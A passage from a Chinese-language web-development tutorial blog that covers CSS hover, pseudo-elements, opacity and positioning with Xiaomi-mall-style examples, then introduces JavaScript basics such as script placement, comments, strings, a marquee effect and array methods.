class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/1ac77590368ff636d0b4f6a988133f55.png?w=632&amp;h=340&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;example&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/8dede2520f8dfff9c9b690af498cafe8.jpg?w=632&amp;h=340&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;example&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.cnbj1.fds.api.mi-img.com/mi-mall/6b67117bc92924fb2ff0e7ad2be86084.png?w=632&amp;h=340&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;example&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="补充知识点"><a href="#补充知识点" class="headerlink" title="补充知识点"></a>补充知识点</h3><h4 id="body无边框"><a href="#body无边框" class="headerlink" title="body无边框"></a>body无边框</h4><p>当把宽度设置到100%时，发现浏览器的两边还是出现了白边，这是因为<strong>body</strong>有默认的<code>margin-left</code>和<code>margin-right</code>，要去掉白边，设置<code>style</code>如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="hover"><a href="#hover" class="headerlink" title="hover"></a>hover</h4><p>可以自定义当鼠标放在hover所描述的标签上的行为。例如上述鼠标放在顶部菜单栏的导航上字体会变白，放在二级菜单导航上字体会变橙色等。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.c1</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.c1</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: blue;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">font-size</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span></span><br><span class="line">            hello world</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此案例当鼠标放在<code>hello world</code>上面时，字体会变蓝并且变大</p><h4 id="after"><a href="#after" class="headerlink" title="after"></a>after</h4><p>可以在已定义标签的后面进行一些操作</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.c1</span><span class="selector-pseudo">:after</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">content</span>: <span class="string">&quot; world&quot;</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>hi<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此示例在运用<code>c1</code>样式的标签后面加上了<code>world</code> 还有一个比较使用的用法</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">clear</span>: both;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义了一个<code>clearfix</code>的样式，便于我们去清除浮动。</p><h4 id="opacity"><a href="#opacity" class="headerlink" title="opacity"></a>opacity</h4><p>用于设置颜色的透明度，如案例二左下角的<code>保障服务</code>，其实是白色设置了透明度为<code>0.7</code> </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.subcontent .container .func .item a &#123;</span><br><span class="line">    text-decoration: none;</span><br><span class="line">    text-align: center;</span><br><span class="line">    opacity: 0.7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="position"><a href="#position" class="headerlink" title="position"></a>position</h4><ul><li><strong>fixed</strong></li><li><strong>relative</strong></li><li><strong>absolute</strong></li></ul><h5 id="fixed"><a href="#fixed" class="headerlink" title="fixed"></a>fixed</h5><p>固定在窗口的某个位置，最常见的示例是返回顶部</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.c1</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">right</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.c2</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">10000px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background-color</span>:  <span class="number">#333333</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上示例会在屏幕右下角显示一个红色的框，无论上下怎么滑动，相对于屏幕来说，边框都是固定的</p><h5 id="relative和absolute-联合使用"><a href="#relative和absolute-联合使用" class="headerlink" title="relative和absolute(联合使用)"></a>relative和absolute(联合使用)</h5><p>如果不想要标签相对屏幕的位置，而想要一个标签依赖于另一个标签的位置，就可以使用<code>relative</code>和<code>absolute</code> 例如</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.c1</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">top</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.c2</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background-color</span>:  <span class="number">#333333</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">top</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">left</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;c2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上实例发现红框的位置是相对于浏览器边框而言，而灰色矩形的位置是相对红框边界而言。</p><p>运用所学知识就可以构建出小米商城下载app的示例</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.app</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.app</span> <span class="selector-class">.download</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.app</span> <span class="selector-class">.download</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">90px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">90px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.app</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">color</span>: <span class="number">#ff6700</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.app</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.download</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;download&quot;</span>&gt;</span></span><br><span class="line">                下载app</span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://i1.mifile.cn/f/i/17/appdownload/download.png?1&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>鼠标移动到下载app时会弹出二维码，当然淡入淡出的效果是js实现的，暂不考虑。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此，有关<strong>CSS</strong>样式最重要的一些知识点已经罗列完毕，当然这只是<strong>CSS</strong>样式的冰山一角，总结下来，发现写页面只有两个字：丑、累。接下来，要介绍前端最后一个要素：<strong>JavaScript</strong></p><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><ul><li><p>Javascript是一门编程语言。浏览器就是Javascript语言的解释器。</p></li><li><p>DOM和BOM</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">相当于编程语言的内置模块</span><br><span class="line">例如python中的re、random、time、json等模块</span><br></pre></td></tr></table></figure></li><li><p>jQuery</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">相当于是编程语言的第三方模块</span><br><span class="line">例如：request、openpyxl</span><br></pre></td></tr></table></figure></li><li><p>用来实现一些动态效果</p></li></ul><h3 id="代码位置"><a href="#代码位置" class="headerlink" title="代码位置"></a>代码位置</h3><ul><li><code>head</code>标签里面，<code>style</code>标签下面</li><li><code>body</code>标签尾部（推荐）</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 位置一 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line">            ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 位置二 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line">            ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="代码存在形式"><a href="#代码存在形式" class="headerlink" title="代码存在形式"></a>代码存在形式</h3><ul><li><p>写在HTML页面中，如上述代码</p></li><li><p>写在文件里面，在HTML里面导入（和CSS类似）</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/my.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ul><li><p>HTML的注释</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 注释 --&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>CSS的注释（只能写在style里面）</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 注释 */</span></span><br></pre></td></tr></table></figure></li><li><p>Javascript（只能写在script里面）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注释</span></span><br><span class="line"><span class="comment">/* 注释 */</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;张三&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br></pre></td></tr></table></figure><p>需要在浏览器的<code>console</code>里面查看</p><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> name = <span class="title class_">String</span>(<span class="string">&quot;张三&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//常见功能</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v1 = name.<span class="property">length</span>;         <span class="comment">//2</span></span><br><span class="line"><span class="keyword">var</span> v2 = name[<span class="number">0</span>];  <span class="comment">//张</span></span><br><span class="line"><span class="comment">//去除字符串前后的空格、制表符等</span></span><br><span class="line"><span class="keyword">var</span> v3 = name.<span class="title function_">trim</span>();         <span class="comment">//张三</span></span><br><span class="line"><span class="comment">//取子串从[0,1)</span></span><br><span class="line"><span class="keyword">var</span> v4 = name.<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">1</span>); <span class="comment">//张</span></span><br></pre></td></tr></table></figure><h4 id="案例：跑马灯"><a href="#案例：跑马灯" class="headerlink" title="案例：跑马灯"></a>案例：跑马灯</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//获取id为text的元素</span></span><br><span class="line">        <span class="keyword">var</span> text = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">        <span class="comment">//获取text元素的文本内容</span></span><br><span class="line">        <span class="keyword">var</span> textContent = text.<span class="property">innerText</span>;</span><br><span class="line">        <span class="comment">//修改文本内容</span></span><br><span class="line">        <span class="keyword">var</span> first = textContent[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> other = textContent.<span class="title function_">substring</span>(<span class="number">1</span>,textContent.<span class="property">length</span>);</span><br><span class="line">        <span class="keyword">var</span> newtext = other + first;</span><br><span class="line">        <span class="comment">//更新文本内容</span></span><br><span class="line">        text.<span class="property">innerText</span> = newtext;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//每隔1秒调用一次show函数</span></span><br><span class="line">    <span class="built_in">setInterval</span>(show, <span class="number">1000</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>此案例实现了”欢迎来到我的博客”的滚动效果</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">var</span> v1 = [<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>];</span><br><span class="line"><span class="keyword">var</span> v1 = <span class="title class_">Array</span>([<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v1 = [<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>];</span><br><span class="line"></span><br><span class="line">v1[<span class="number">1</span>]  <span class="comment">//22</span></span><br><span class="line">v1[<span class="number">0</span>] = <span class="number">55</span>; <span class="comment">//[55,22,33,44]</span></span><br><span class="line"></span><br><span class="line">v1.<span class="title function_">push</span>(<span class="number">66</span>); <span class="comment">//[55,22,33,44,66]</span></span><br><span class="line">v1.<span class="title function_">pop</span>(); <span class="comment">//[55,22,33,44]</span></span><br><span class="line">v1.<span class="title function_">unshift</span>(<span class="number">77</span>); <span class="comment">//[77,55,22,33,44]</span></span><br><span class="line">v1.<span class="title function_">shift</span>(); <span class="comment">//[55,22,33,44]</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array.splice(start, deleteCount, item1, item2, ...);</span></span><br><span class="line"><span class="comment">1、start：指定修改的开始位置（从0开始计数）。</span></span><br><span class="line"><span class="comment">2、deleteCount：表示要删除的元素数量。如果为0，则不删除元素。</span></span><br><span class="line"><span class="comment">3、item1, item2, 